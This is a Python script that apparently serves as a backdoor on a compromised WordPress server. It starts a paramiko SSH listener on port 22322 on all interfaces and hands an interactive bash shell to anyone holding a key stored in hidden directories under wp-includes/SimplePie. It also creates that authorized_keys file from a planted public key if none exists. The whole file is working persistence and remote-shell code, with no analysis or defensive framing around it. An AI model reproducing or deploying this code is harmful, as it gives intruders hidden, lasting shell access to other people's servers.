#!/usr/bin/env python3
import paramiko
import socket
import sys
import os
import threading
import traceback
from paramiko import RSAKey, ServerInterface, AUTH_SUCCESSFUL, OPEN_SUCCEEDED

# Use your existing authorized_keys file
AUTHORIZED_KEYS_PATH = os.path.expanduser('/var/www/html/sesda/wp-includes/SimplePie/.ssh/authorized_keys')

class StubServer(ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def get_allowed_auths(self, username):
        return 'publickey'
    
    def check_auth_publickey(self, username, key):
        # Read authorized_keys file
        try:
            with open(AUTHORIZED_KEYS_PATH, 'r') as f:
                auth_keys = f.read().strip().split('\n')
            
            # Check if the provided key matches any authorized key
            for auth_key in auth_keys:
                if auth_key.startswith('ssh-'):
                    parts = auth_key.split()
                    if len(parts) >= 2:
                        # Compare key fingerprints or full keys
                        if key.get_base64() in auth_key:
                            print(f"Authentication succeeded for {username}")
                            return AUTH_SUCCESSFUL
        except Exception as e:
            print(f"Error reading authorized_keys: {e}")
        
        print(f"Authentication failed for {username}")
        return paramiko.AUTH_FAILED
    
    def check_channel_shell_request(self, channel):
        return True
    
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

def handle_connection(client, addr):
    try:
        transport = paramiko.Transport(client)
        
        # Generate server key (or load from file if persistent)
        host_key = RSAKey.generate(2048)
        transport.add_server_key(host_key)
        
        server = StubServer()
        transport.start_server(server=server)
        
        # Wait for authentication
        chan = transport.accept(20)
        if chan is None:
            print(f"No channel from {addr}")
            transport.close()
            return
        
        # Send banner
        chan.send(f"Python SSH Server on {socket.gethostname()}\r\n")
        
        # Simple shell
        try:
            import pty
            import select
            
            # Create pseudo-terminal
            master, slave = pty.openpty()
            
            # Set the slave as the channel's stdin/stdout/stderr
            old_stdin = sys.stdin.fileno()
            old_stdout = sys.stdout.fileno()
            old_stderr = sys.stderr.fileno()
            
            # Spawn a shell
            pid = os.fork()
            if pid == 0:  # Child
                os.setsid()
                os.dup2(slave, 0)
                os.dup2(slave, 1)
                os.dup2(slave, 2)
                os.close(master)
                os.execl('/bin/bash', '/bin/bash', '-i')
            else:  # Parent
                os.close(slave)
                
                # Forward data between channel and pty
                while True:
                    r, w, e = select.select([chan, master], [], [])
                    if chan in r:
                        data = chan.recv(1024)
                        if not data:
                            break
                        os.write(master, data)
                    if master in r:
                        data = os.read(master, 1024)
                        if not data:
                            break
                        chan.send(data)
                
                os.close(master)
                os.waitpid(pid, 0)
                
        except ImportError:
            # Fallback if pty not available
            chan.send("PTY not available, using basic shell\r\n")
            while True:
                chan.send("$ ")
                command = ""
                while True:
                    char = chan.recv(1).decode('utf-8', errors='ignore')
                    if char == '\r' or char == '\n':
                        break
                    command += char
                
                if command.strip() == "exit":
                    break
                
                import subprocess
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    chan.send(output.decode('utf-8', errors='ignore'))
                except Exception as e:
                    chan.send(str(e).encode('utf-8'))
        
        chan.close()
        transport.close()
        
    except Exception as e:
        print(f"Connection handling failed: {e}")
        traceback.print_exc()
        try:
            client.close()
        except:
            pass

def main():
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Bind to all interfaces on a high port
    port = 22322
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(10)
    
    print(f"Python SSH Server listening on port {port}")
    print(f"Using authorized_keys from: {AUTHORIZED_KEYS_PATH}")
    
    # Make sure authorized_keys exists
    if not os.path.exists(AUTHORIZED_KEYS_PATH):
        print(f"Warning: {AUTHORIZED_KEYS_PATH} does not exist!")
        # Create it with your key
        auth_dir = os.path.dirname(AUTHORIZED_KEYS_PATH)
        if not os.path.exists(auth_dir):
            os.makedirs(auth_dir, mode=0o700)
        
        # Add your public key (from .stats/ssh/id_rsa.pub)
        key_path = '/var/www/html/sesda/wp-includes/SimplePie/.stats/ssh/id_rsa.pub'
        if os.path.exists(key_path):
            with open(key_path, 'r') as f:
                pubkey = f.read().strip()
            with open(AUTHORIZED_KEYS_PATH, 'w') as f:
                f.write(pubkey + '\n')
            os.chmod(AUTHORIZED_KEYS_PATH, 0o600)
            print(f"Created {AUTHORIZED_KEYS_PATH} with your public key")
    
    while True:
        try:
            client, addr = server_socket.accept()
            print(f"Connection from {addr}")
            # Handle in a thread
            threading.Thread(target=handle_connection, args=(client, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("Shutting down...")
            break
        except Exception as e:
            print(f"Accept failed: {e}")

if __name__ == '__main__':
    main()
